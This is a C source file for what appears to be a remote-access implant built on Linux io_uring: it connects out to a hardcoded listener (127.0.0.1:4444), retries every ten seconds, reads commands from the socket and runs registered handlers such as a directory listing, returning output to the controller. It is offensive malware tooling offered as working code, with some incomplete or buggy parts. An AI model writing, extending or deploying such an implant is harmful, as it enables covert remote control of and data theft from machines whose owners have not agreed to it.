#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <liburing.h>
#include <errno.h>
#include "commands/command_header.h"

// Constants
#define QUEUE_DEPTH 16    // Simplest case: one request at a time
#define BUFFER_SIZE 16384 // Buffer for receiving data
#define HOST "127.0.0.1"
#define PORT 4444

#define SLEEP 10
#define RECONNECT_INT 10

char *get_args(char *str) {
    char *arguments = NULL;
    char *space = strchr(str, ' ');
    if (space != NULL) {
        *space = '\0';
        arguments = space + 1;
    }
    return arguments;
}

void sanitize_cmd(char *cmd) {
    size_t len = strlen(cmd);
    while (len > 0 && (cmd[len-1] == '\n' || cmd[len-1] == '\r' || cmd[len-1] == ' ' || cmd[len-1] == '\t'))
        cmd[--len] = '\0';
}

//Hash map to find functions and execute them
#define CMD_BUFFER 256
#define TABLE_SIZE 20
#define CMD_LEN 50

typedef void (*func_ptr)(struct io_uring *ring, int sockfd, const char *args);

typedef struct {
    char command[CMD_BUFFER];
    func_ptr func;
} check;

check * hash_table[TABLE_SIZE];

unsigned int hash(char *name) {
    int length = strnlen(name, CMD_BUFFER);
    unsigned int hash_value = 0;
    for (int i = 0; i < length; i++) {
        hash_value += name[i];
        hash_value = (hash_value * name[i]) % TABLE_SIZE;
    }
    return hash_value;
}

check function[] = {
    {"cmd_ls", cmd_ls},
    {"", NULL}
};

bool hash_insert() {
    for (int i = 0; function[i].func != NULL; i++) {
        int index = hash(function[i].command);
        if (hash_table[index] != NULL) {
            printf("ERROR: Hash Table Insert Collision!!");
            return false;
        }
        else {
            hash_table[index] = &function[i];
        }
    }
    return true;
}

void command_execute(struct io_uring *ring, int sockfd, char *input) {
    char *args = get_args(input);
    char *command = input;
    sanitize_cmd(command);
    char lookup_key[CMD_LEN];
    snprintf(lookup_key, sizeof(lookup_key), "cmd_%s", command);
    int index = hash(lookup_key);
    if (hash_table[index] != NULL && strcmp(hash_table[index]->command, lookup_key) == 0) {
        hash_table[index]->func(ring, sockfd, args);
    } else {
        const char *msg = "Command not found! How did you do this??\n";
        send2serv(ring, sockfd, msg, strlen(msg));
    }
}


// To make the workflow clear, we'll use an enum for the current state.
enum {
    STATE_SOCKET,
    STATE_CONNECT,
    STATE_SEND,
    STATE_RECV,
};

// A struct to hold all the data associated with a request.
// In a real app, you'd have many of these. Here, we only need one.
typedef struct request {
    int event_type;
    int client_socket;
    char buffer[BUFFER_SIZE];
    struct iovec iov;
} request_t;

int connection(struct io_uring *ring, request_t *req) {
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;

    const char *host = HOST;
    const int port = PORT;

    req->event_type = STATE_SOCKET;

    // Get a Submission Queue Entry (SQE) from the submission ring.
    sqe = io_uring_get_sqe(ring);
    // Prepare the SQE for a socket operation.
    io_uring_prep_socket(sqe, AF_INET, SOCK_STREAM, 0, 0);
    // Associate our request struct with this SQE.
    io_uring_sqe_set_data(sqe, &req);

    // Tell the kernel we have a new request ready.
    io_uring_submit(ring);
    // Wait for the operation to complete and get the Completion Queue Entry (CQE).
    io_uring_wait_cqe(ring, &cqe);

    if (cqe->res < 0) {
        fprintf(stderr, "Socket creation failed: %s\n", strerror(-cqe->res));
        return 1;
    }
    // The result of a successful socket call is the new file descriptor.
    req->client_socket = cqe->res;
    //printf("Socket created. fd: %d\n", req->client_socket);
    // Mark the CQE as seen so the kernel can reuse it.
    io_uring_cqe_seen(ring, cqe);


    // --- 4. Connect to the Server ---
    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &serv_addr.sin_addr);

    req->event_type = STATE_CONNECT;
    sqe = io_uring_get_sqe(ring);
    // Prepare the SQE for a connect operation.
    io_uring_prep_connect(sqe, req->client_socket, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    io_uring_sqe_set_data(sqe, &req);

    io_uring_submit(ring);
    io_uring_wait_cqe(ring, &cqe);

    //printf("Connected to %s:%d\n", host, port);
    io_uring_cqe_seen(ring, cqe);
    return req->client_socket;
}

int main() {
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    hash_insert();
    // --- 2. Initialize io_uring ---
    // This sets up the shared memory rings between our app and the kernel.
    if (io_uring_queue_init(QUEUE_DEPTH, &ring, 0) < 0) {
        perror("io_uring_queue_init");
        return 1;
    }

    
    size_t n;
    while (true) {
        request_t *req = malloc(sizeof(request_t));
        int sockfd = connection(&ring, req);

        if (sockfd < 0) {
            sleep(RECONNECT_INT);
            continue;
        }

        while (true) {
            // Receive a Response
            req->event_type = STATE_RECV;
            // Point the iovec to our request's buffer to store the response.
            req->iov.iov_base = req->buffer;
            req->iov.iov_len = BUFFER_SIZE - 1;

            sqe = io_uring_get_sqe(&ring);
            // Prepare the SQE for a receive operation (using readv).
            io_uring_prep_readv(sqe, req->client_socket, &req->iov, 1, 0);
            io_uring_sqe_set_data(sqe, req);
            io_uring_submit(&ring);
            struct __kernel_timespec ts = { .tv_sec = 1, .tv_nsec = 0 };
            int ret = io_uring_wait_cqe_timeout(&ring, &cqe, &ts);
            //io_uring_wait_cqe(&ring, &cqe);
            if (ret == -ETIME) {
                sleep(SLEEP);
                continue;
            } else if (ret < 0) {
                break;
            } else {
                io_uring_cqe_seen(&ring, cqe);

                if (cqe->res <= 0) {
                    break;
                }
                // The result is the number of bytes read.
                n = cqe->res;

                req->buffer[n] = '\0';
                sanitize_cmd(req->buffer);

                if (strcmp(req->buffer, "exit") == 0) {
                    close(req->client_socket);
                    io_uring_queue_exit(&ring);
                    free(req);
                    //printf("Connection closed and resources freed.\n");
                    return 0;
                }
                command_execute(&ring, req->client_socket, req->buffer);
            }
        }

        close(req->client_socket);
        free(req); // Free the heap-allocated request object
        sleep(RECONNECT_INT);
    }
    io_uring_queue_exit(&ring);
    return 0;
}
